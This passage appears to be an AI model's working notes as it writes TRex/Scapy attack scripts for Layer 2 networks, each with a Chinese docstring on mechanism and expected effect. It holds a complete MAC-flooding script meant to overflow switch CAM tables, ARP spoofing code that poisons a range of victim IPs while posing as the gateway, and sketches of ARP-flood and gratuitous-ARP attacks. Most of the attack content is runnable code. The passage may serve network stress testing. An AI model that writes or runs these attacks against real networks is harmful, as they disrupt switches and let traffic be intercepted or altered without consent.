_pps=80000 发送速率(帧/秒)\n          duration=30 攻击持续秒数\n          mac_random_range=(2^48-1) 随机源 MAC 取值范围\n预期效果: 交换机 CAM 表溢出 -> 未知单播泛洪、转发性能骤降、旁路嗅探可行\n\"\"\"\nimport time\nfrom trex_stl_lib.api import *\nfrom scapy.layers.l2 import Ether\nfrom scapy.layers.inet import IP, UDP\n\nSERVER = \"10.99.80.222\"\nPORTS = [0]\nTX_PPS = 80000\nDURATION = 30\n\nc = STLClient(server=SERVER)\nc.connect()\ntry:\n    c.reset(ports=PORTS)\n    base = Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=\"00:00:00:00:00:00\") / \\\n           IP(src=\"10.0.0.1\", dst=\"10.0.0.2\") / UDP(sport=1024, dport=1025)\n    vm = STLScVmRaw([\n        STLVmFlowVar(name=\"rsrc\", min_value=1, max_value=(2**48) - 1, size=6, op=\"random\"),\n        STLVmWrFlowVar(fv_name=\"rsrc\", pkt_offset=6),  # dst MAC offset 6\n    ])\n    pkt = STLPktBuilder(pkt=base, vm=vm)\n    stream = STLStream(packet=pkt, mode=STLTXCont(pps=TX_PPS))\n    c.add_streams(stream, ports=PORTS)\n    c.start(ports=PORTS, duration=DURATION, force=True)\n    c.wait_on_traffic(ports=PORTS)\nfinally:\n    c.stop(ports=PORTS)\n    c.disconnect()\n```\n\nWait, pkt_offset=6 is src MAC. Good. dst is broadcast at offset 0.\n\nNote: writing a random 48-bit value to 6 bytes. Fine.\n\nHmm, `STLVmWrFlowVar(fv_name=\"rsrc\", pkt_offset=6)` - default add_val 0.\n\nOK.\n\n**cat_l2_arp_spoof.py**\n\n```python\n\"\"\"\n攻击名称: ARP 欺骗 / ARP 缓存投毒 (ARP Spoofing)\n攻击类别: L2 数据链路层 - 中间人 (MITM)\n攻击机制: 伪造大量 ARP 应答(op=2)，把网关 IP 映射到攻击者/随机 MAC，向子网内\n          不同受害 IP 持续投毒，篡改其 ARP 缓存，将流量劫持到攻击者实现 MITM。\n关键参数: tx_pps=2000 投毒帧速率\n          duration=30 持续秒数\n          gateway_ip=10.0.0.1 被冒充的网关地址\n          victim_start/victim_end 受害 IP 范围\n预期效果: 受害主机 ARP 表被篡改，流量被中间人劫持、可嗅探/篡改\n\"\"\"\n```\n\nVM: vary pdst (target IP) so poison many victims. ARP reply with psrc=gateway, hwsrc=attacker.\n\nARP reply packet: `Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(op=2, hwsrc=attacker_mac, psrc=gateway, hwdst=\"00:00:00:00:00:00\", pdst=\"10.0.0.100\")`.\n\nVary pdst: ARP starts at offset 14, pdst at offset 14+24=38, size 4. Use `STLVmFlowVar` ip with op=\"inc\" min=IP of victim_start max=victim_end... Actually there's `STLVmFlowVar` supports `op=\"inc\"` and `size=4`. Or use `op=\"random\"`.\n\nLet me use random within range but need IP ints. Better use `op=\"inc\"` with min_value = int(ip), max_value = int(ip). Convert with a helper.\n\nLet me write a helper `ip2int`.\n\nActually simpler: vary psrc (the spoofed gateway IP changes) so attacker claims to be many gateways. Hmm, common attack targets many victims. Let me vary pdst.\n\nLet me code:\n\n```python\nimport struct\ndef ip2int(ip):\n    return struct.unpack(\"!I\", socket.inet_aton(ip))[0]\n```\nUse socket. Or use scapy's `int(IP(...))`. Let me just import socket.\n\nActually simpler: define min/max as integers computed manually: 10.0.0.1 = (10<<24)|(0<<16)|(0<<8)|1 = 167772161.\n\nLet me just compute in code with socket.\n\n```python\nimport socket, struct\ndef ip2int(ip): return struct.unpack(\"!I\", socket.inet_aton(ip))[0]\n```\n\nThen:\n```python\nvm = STLScVmRaw([\n    STLVmFlowVar(name=\"vtip\", min_value=ip2int(\"10.0.0.100\"), max_value=ip2int(\"10.0.0.250\"), size=4, op=\"inc\"),\n    STLVmWrFlowVar(fv_name=\"vtip\", pkt_offset=38),  # ARP pdst\n])\n```\n\nWait, does STLVmFlowVar op=\"inc\" wrap around after max? Yes it should cycle. Good.\n\nHmm but inc over 150 values then wrap. Fine.\n\n**cat_l2_arp_flood.py**\n\nARP request flooding: send ARP requests for a huge range of random IPs, forcing target to generate many ARP requests / neighbor entries.\n\n```python\nARP(op=1, psrc=random, pdst=random)\n```\nVary psrc and pdst with random.\n\n**cat_l2_gratuitous_arp.py**\n\nGratuitous ARP: broadcast ARP request/reply announcing self IP-MAC, used to update caches. Attack: spoof many gratuitous ARPs claiming various IPs to random MACs.\n\n```python\nEther(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(op=1, psrc=X, pdst=X)  # gratuitous\n```\nVary X and hwsrc.\n\nNow batch 2: 5-8.\n\n**cat_l2_vlan_hopping.py** - dou